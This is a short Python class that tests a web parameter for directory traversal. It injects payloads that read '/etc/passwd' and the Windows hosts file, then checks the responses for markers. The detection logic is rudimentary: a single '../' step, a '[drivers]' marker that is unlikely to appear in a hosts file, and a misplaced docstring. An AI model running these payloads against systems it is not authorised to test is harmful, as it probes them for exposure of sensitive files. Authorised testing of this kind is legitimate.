import requests


class DirectoryTraversalTester:
    """
    Initializes a DirectoryTraversalTester object.
    Args:
        target_url (str): The target URL to test.
        param (str): The parameter to test for directory traversal vulnerability.
    """
    """
    Runs the directory traversal vulnerability test.
    Returns:
        list: A list of tuples containing the payload and a boolean indicating if the test was successful.
    """

    def __init__(self, target_url, param):
        self.target_url = target_url
        self.param = param
        self.payloads = ["../etc/passwd",
                         "..\\windows\\system32\\drivers\\etc\\hosts"]

    def run_test(self):
        results = []
        for payload in self.payloads:
            test_url = f"{self.target_url}?{self.param}={payload}"
            response = requests.get(test_url)
            if "root:" in response.text or "[drivers]" in response.text:
                results.append((payload, True))
            else:
                results.append((payload, False))
        return results
